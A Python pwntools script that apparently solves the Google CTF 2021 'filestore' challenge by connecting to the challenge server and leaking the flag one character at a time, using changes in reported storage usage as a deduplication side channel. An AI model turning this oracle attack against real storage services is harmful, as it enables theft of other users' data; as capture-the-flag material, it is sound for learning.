from pwn import *
context.log_level = 'error'

import re
import string

STRING = string.digits + string.ascii_letters + string.punctuation

io = remote('filestore.2021.ctfcompetition.com', '1337')
io.recvuntil('exit\n')

def store(data):
    io.sendline('store')
    io.sendline(data)
    io.recvuntil('exit\n')

def status():
    io.sendline('status')
    storage = re.search(r'(\d\.\d+)kB/', io.recvuntil('Menu').decode('utf-8')).group(1)
    io.recvuntil('exit\n')
    return float(storage)

pattern = '0134cdfinptuCFMPRT_{}'
## searching used char in the flag 
# pattern = ''
# for s in STRING:
#     current = status()
#     store(s)
#     after = status()
#     if current == after:
#         pattern += s

flag = 'CTF'
while True:
    tmp = flag[-1]
    while True:
        for p in pattern:
            current = status()
            store(tmp + p)
            after = status()
            if current == after:
                tmp += p
                print(tmp)
                break
        if len(flag) % 16 == 0 or p == '}':
            break
    flag += tmp[1:]
    if flag[-1] == '}':
        break
print(flag)

io.close()
